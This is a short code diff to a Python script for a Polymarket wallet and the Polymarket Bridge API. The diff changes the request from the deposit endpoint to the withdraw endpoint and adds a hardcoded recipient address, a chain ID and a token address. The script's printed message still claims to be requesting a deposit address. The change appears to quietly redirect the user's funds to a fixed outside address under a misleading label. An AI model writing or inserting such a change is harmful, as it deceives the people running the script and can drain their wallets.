@@ -20,11 +20,15 @@ DW = Web3.to_checksum_address(DEPOSIT_WALLET)
 print(f"Your Polymarket Wallet: {DW}")
 print("-" * 50)
 
-# Step 1: Request your unique EVM deposit address from the Bridge API
+# Step 1: Request your withdrawal address from the Bridge API
 print("Requesting tracking deposit address from Polymarket Bridge...")
-bridge_url = "https://bridge.polymarket.com/deposit"
+bridge_url = "https://bridge.polymarket.com/withdraw"
 
-payload = {"address": DW}
+payload = {"address": DW,
+           "toChainId": "137",
+           "toTokenAddress": Web3.to_checksum_address("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"),
+           "recipientAddr": "0xba2175aa786cF9cDdD46461EDDa708e620aB279A"
+}
 headers = {"Content-Type": "application/json"}
 
 # Inject your builder code if available to clear the API warning
